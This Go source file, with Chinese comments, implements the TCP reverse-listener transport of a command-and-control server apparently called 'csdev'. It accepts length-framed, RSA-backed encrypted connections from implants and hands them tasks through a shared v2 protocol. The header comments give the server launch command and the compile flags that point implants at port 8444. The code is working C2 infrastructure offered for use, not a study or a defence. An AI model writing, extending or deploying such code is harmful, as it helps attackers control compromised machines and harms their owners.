// csdev :: tcp_listener.go  --  TCP reverse listener (协议 v2 的第二承载层)
//
// 与 HTTP listener 共用 v2ProcessFrame —— 加密、TLV、任务批次完全一致,
// 差别只在承载层: 帧以 [4B 大端长度][帧字节] 分界, 长连接保持。
//
// 用法: csdev-server.exe --tcp 0.0.0.0:8444
// 植入体: gcc ... -DC2_TRANSPORT_TCP=1 -DC2_PORT=8444
package main

import (
	"crypto/rsa"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"
)

const tcpMaxFrame = 8 * 1024 * 1024

type TCPListener struct {
	Name string
	Addr string
	Priv *rsa.PrivateKey

	mu    sync.Mutex
	ln    net.Listener
	conns map[string]net.Conn
	stop  chan struct{}
	start time.Time
}

func NewTCPListener(name, addr string, priv *rsa.PrivateKey) *TCPListener {
	return &TCPListener{
		Name: name, Addr: addr, Priv: priv,
		conns: map[string]net.Conn{},
		start: time.Now(),
	}
}

func (l *TCPListener) Start() error {
	ln, err := net.Listen("tcp", l.Addr)
	if err != nil {
		return err
	}
	l.mu.Lock()
	l.ln = ln
	l.stop = make(chan struct{})
	l.mu.Unlock()
	go l.acceptLoop(ln)
	return nil
}

func (l *TCPListener) Stop() {
	if l.stop != nil {
		select {
		case <-l.stop:
		default:
			close(l.stop)
		}
	}
	// 只用 chan 外加一个 bool 判定, 不在这里把 ln 置 nil:
	// 置 nil 会让并发运行的 acceptLoop 读到 nil 而 panic (实测踩到)。
	l.mu.Lock()
	if l.ln != nil {
		l.ln.Close() // 关监听 socket, 端口随之释放
	}
	for _, c := range l.conns {
		c.Close()
	}
	l.conns = map[string]net.Conn{}
	l.mu.Unlock()
}

// BoundAddr 返回内核实际绑定的地址 (Addr 写 0 端口时用它拿真实端口)。
func (l *TCPListener) BoundAddr() string {
	l.mu.Lock()
	defer l.mu.Unlock()
	if l.ln != nil {
		return l.ln.Addr().String()
	}
	return l.Addr
}

func (l *TCPListener) acceptLoop(ln net.Listener) {
	for {
		c, err := ln.Accept()
		if err != nil {
			return
		}
		go l.serve(c)
	}
}

func (l *TCPListener) serve(c net.Conn) {
	addr := c.RemoteAddr().String()

	l.mu.Lock()
	l.conns[addr] = c
	l.mu.Unlock()

	defer func() {
		c.Close()
		l.mu.Lock()
		delete(l.conns, addr)
		l.mu.Unlock()
		logf("[tcp] %s 断开 (当前 %d 条连接)", addr, l.connCount())
	}()

	logf("[tcp] %s 接入", addr)

	var hdr [4]byte
	for {
		// 长连接: 读超时放宽, 但必须存在以免死连接占资源
		c.SetReadDeadline(time.Now().Add(30 * time.Minute))
		if _, err := io.ReadFull(c, hdr[:]); err != nil {
			return
		}
		n := binary.BigEndian.Uint32(hdr[:])
		if n == 0 || n > tcpMaxFrame {
			logf("[tcp] %s 帧长度非法 (%d), 断开", addr, n)
			return
		}
		buf := make([]byte, n)
		if _, err := io.ReadFull(c, buf); err != nil {
			return
		}

		resp := v2ProcessFrame(buf, addr, l.Priv)

		c.SetWriteDeadline(time.Now().Add(60 * time.Second))
		if resp == nil {
			// 空应答: 用 0 长度帧占位, 让客户端知道这一轮结束了
			binary.BigEndian.PutUint32(hdr[:], 0)
			if _, err := c.Write(hdr[:]); err != nil {
				return
			}
			continue
		}
		if len(resp) > tcpMaxFrame {
			logf("[tcp] %s 应答过大 (%d), 断开", addr, len(resp))
			return
		}
		binary.BigEndian.PutUint32(hdr[:], uint32(len(resp)))
		if _, err := c.Write(hdr[:]); err != nil {
			return
		}
		if _, err := c.Write(resp); err != nil {
			return
		}
	}
}

func (l *TCPListener) connCount() int {
	l.mu.Lock()
	defer l.mu.Unlock()
	return len(l.conns)
}

// ---------------------------------------------------------------- 接线

// startTCPListener 解析 "ip:port" 并启动 TCP 承载。
//
// 只负责"起一个实例": 注册表登记 (id/kind/addr/事件日志) 由调用方
// listener_admin.go 的 listenerAdd 统一完成 —— 参数路径 (--tcp) 与
// REST (/api/listener/add) 走的是同一条 Add, 不再是两套实现。
func startTCPListener(spec string, priv *rsa.PrivateKey) (*TCPListener, error) {
	spec = strings.TrimSpace(spec)
	if spec == "" {
		return nil, nil
	}
	host, portStr, err := net.SplitHostPort(spec)
	if err != nil {
		return nil, fmt.Errorf("地址格式应为 ip:port: %w", err)
	}
	port, err := strconv.Atoi(portStr)
	if err != nil || port < 0 || port > 65535 {
		return nil, fmt.Errorf("端口非法: %s", portStr)
	}
	if host == "" {
		host = "0.0.0.0"
	}

	tl := NewTCPListener(fmt.Sprintf("csdev-tcp-%d", port), spec, priv)
	if err := tl.Start(); err != nil {
		return nil, err
	}
	logf("  TCP 入口: %s  (帧分界 [4B 大端长度], 共用 v2 加密与任务协议)", tl.BoundAddr())
	return tl, nil
}
